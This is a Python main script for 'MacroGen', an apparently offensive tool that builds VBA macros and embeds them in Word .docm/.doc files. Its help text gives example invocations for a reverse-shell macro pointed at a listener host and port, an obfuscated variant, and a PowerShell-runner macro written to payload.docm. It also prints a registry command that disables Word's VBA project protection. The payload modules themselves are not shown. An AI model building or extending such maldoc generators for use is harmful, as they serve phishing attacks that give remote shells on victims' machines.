import os
import importlib
import argparse
import platform
from builder import create_docm
from colorama import Fore, Style, init

init(autoreset=True)

IS_WINDOWS = platform.system() == "Windows"
MACRO_FOLDER = "macros"
OBFUSCATED_FOLDER = "macros_obf"

def list_macros(macro_folder):
    macros = []
    if not os.path.exists(macro_folder):
        print(f"[!] Macro folder '{macro_folder}' does not exist.")
        return macros

    for file in os.listdir(macro_folder):
        if file.endswith(".py") and not file.startswith("__"):
            mod_name = file[:-3]
            try:
                mod = importlib.import_module(f"{macro_folder}.{mod_name}")
                macros.append((mod_name, mod))
            except Exception:
                continue
    return macros

def show_macro_help(macro_name, macro_folder):
    try:
        mod = importlib.import_module(f"{macro_folder}.{macro_name}")
        print(Fore.BLUE + Style.BRIGHT + f"\n📘 Macro Help: {mod.metadata['name']}")
        print(Fore.WHITE + "Description: " + Fore.CYAN + mod.metadata['description'])
        if mod.metadata['parameters']:
            print(Fore.WHITE + "\nRequired Parameters:")
            for p in mod.metadata['parameters']:
                print(f"  {Fore.YELLOW}--{p}{Style.RESET_ALL} <value>")
            example = f"python3 main.py --macro {macro_name} " + " ".join([f"--{p} <value>" for p in mod.metadata['parameters']])
            print(Fore.GREEN + "\nExample:")
            print(f"  {example} --output output.vba")
        else:
            print(Fore.WHITE + "\nThis macro does not require any parameters.")
            print(Fore.GREEN + "\nExample:")
            print(f"  python3 main.py --macro {macro_name} --output output.vba")
    except ModuleNotFoundError:
        print(f"[!] Macro '{macro_name}' not found in {macro_folder}.")

def show_general_help(macro_folder):
    print(Fore.BLUE + Style.BRIGHT + "\n🟦 MacroGen - Macro Generator Tool")
    print(Fore.WHITE + "Author: " + Fore.CYAN + "Jose" + Fore.WHITE + " | Platform-aware VBA Macro Generator\n")

    print(Fore.WHITE + Style.BRIGHT + "Usage:")
    print(Fore.YELLOW + "  python main.py --macro <macro_name> [--output <file>] [--obf] [--<param> <value> ...]\n")

    print(Fore.WHITE + Style.BRIGHT + "Arguments:")
    print(f"  {Fore.CYAN}--macro <name>{Style.RESET_ALL:<15} Macro name to use")
    print(f"  {Fore.CYAN}--output <file>{Style.RESET_ALL:<14} Output file (.vba, .doc, .docm)")
    print(f"  {Fore.CYAN}--obf{Style.RESET_ALL:<24} Use obfuscated version from 'macros_obf'")
    print(f"  {Fore.CYAN}-h, --help{Style.RESET_ALL:<19} Show this help message")
    print(f"  {Fore.CYAN}-h, --help <macro>{Style.RESET_ALL:<11} Show help for a specific macro\n")

    print(Fore.GREEN + Style.BRIGHT + "Examples:")
    print("  python main.py --macro reverse_shell --lhost 192.168.1.5 --lport 4444 --output shell.vba")
    print("  python main.py --macro messagebox --output info.vba")
    print("  python main.py --macro ps1_macro_runner --lhost 192.168.1.5 --lport 443 --ps-filename run.ps1 --output payload.docm")
    print("  python main.py --macro reverse_shell --obf --lhost 192.168.1.5 --lport 4444 --output obf.vba\n")

    print(Fore.MAGENTA + Style.BRIGHT + f"Available Macros in '{macro_folder}/':")
    for mod_name, mod in list_macros(macro_folder):
        print(f"  - {Fore.YELLOW}{mod_name}{Style.RESET_ALL}: {mod.metadata['description']}")

def main():
    parser = argparse.ArgumentParser(description="Macro Generator Tool", add_help=False)
    parser.add_argument("--macro", dest="macro", help="Macro name to use")
    parser.add_argument("--output", dest="output", help="Output file name (.docm, .doc, .vba)")
    parser.add_argument("--obf", action="store_true", help="Use obfuscated version of the macro")
    parser.add_argument("--help", "-h", nargs="?", dest="macro_help", const="list",
                        help="Show available macros or details for a specific macro")

    args, unknown_args = parser.parse_known_args()
    macro_folder = OBFUSCATED_FOLDER if args.obf else MACRO_FOLDER
    macro_file_name = args.macro + "_obf" if args.obf else args.macro

    if args.macro_help:
        if args.macro_help == "list":
            show_general_help(macro_folder)
        else:
            show_macro_help(args.macro_help + ("_obf" if args.obf else ""), macro_folder)  # <-- also fixed here
        return

    if not args.macro:
        show_general_help(macro_folder)
        return

    try:
        selected = importlib.import_module(f"{macro_folder}.{macro_file_name}")  # <-- fixed
    except ModuleNotFoundError:
        print(f"[!] Macro '{args.macro}' not found in '{macro_folder}'.")
        return

    param_dict = {}
    expected_params = selected.metadata.get("parameters", [])
    for param in expected_params:
        if f"--{param}" in unknown_args:
            idx = unknown_args.index(f"--{param}")
            if idx + 1 < len(unknown_args):
                param_dict[param] = unknown_args[idx + 1]
            else:
                print(f"[!] Missing value for --{param}")
                return
        else:
            print(f"[!] Missing required parameter --{param}")
            return

    macro_code = selected.generate_macro_code(param_dict)
    output_file = args.output

    if not output_file:
        if IS_WINDOWS:
            output_file = input("Enter full output file path (with extension .doc, .docm or .vba): ")
        else:
            output_file = input("Enter output .vba file path: ")

    if not os.path.isabs(output_file):
        output_file = os.path.abspath(output_file)

    ext = os.path.splitext(output_file)[1].lower()

    if not IS_WINDOWS:
        if ext != ".vba":
            print("[!] On non-Windows systems, only .vba output is supported. Forcing .vba extension.")
            output_file = os.path.splitext(output_file)[0] + ".vba"

        with open(output_file, "w") as f:
            f.write(macro_code)
        print(f"[+] Macro code saved to {output_file}")
    else:
        if ext in [".vba", ".txt"]:
            with open(output_file, "w") as f:
                f.write(macro_code)
            print(f"[+] Macro code saved to {output_file}")
        elif ext in [".docm", ".doc"]:
            print(Fore.YELLOW + "[*] Note: Ensure 'Trust access to the VBA project object model' is enabled.")
            print("    Run this as admin if needed:\n")
            print(Fore.CYAN + '    reg add "HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security" /v AccessVBOM /t REG_DWORD /d 1 /f\n')
            try:
                create_docm(macro_code, output_file)
                print(Fore.GREEN + f"[+] File saved to {output_file}")
            except Exception as e:
                print(Fore.RED + f"\n[!] Error while creating the document: {e}")
                print(Fore.YELLOW + "[!] Possible fix:")
                print(Fore.CYAN + '    reg add "HKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security" /v AccessVBOM /t REG_DWORD /d 1 /f')
                print("    Restart Word and try again.")
        else:
            print("[!] Unsupported output file extension. Use .vba, .docm, or .doc")

if __name__ == "__main__":
    main()
